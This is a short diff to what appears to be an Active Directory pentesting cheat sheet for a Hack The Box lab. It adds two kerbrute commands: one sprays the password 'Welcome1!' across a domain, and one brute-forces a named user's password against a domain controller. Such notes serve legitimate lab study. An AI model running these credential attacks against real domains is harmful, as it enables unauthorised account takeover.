@@ -84,6 +84,14 @@ usnchanged                    : 178663
 ridsetreferences              : CN=RID Set,CN=DC1,OU=Domain Controllers,DC=corp,DC=com
 dnshostname                   : DC1.corp.com
 ```
+### Domain PasswordSpray
+```
+./kerbrute_linux_amd64 passwordspray --dc 10.10.11.60 -d frizz.htb userlist "Welcome1!" -v
+```
+### Domain Password Brute-force
+```
+./kerbrute bruteuser --dc 10.10.11.60 -d frizz.htb pass_file M.SchoolBus -v
+```
 #### Object Permissions
 GenericAll: Full permissions on object  
 GenericWrite: Edit certain attributes on the object  
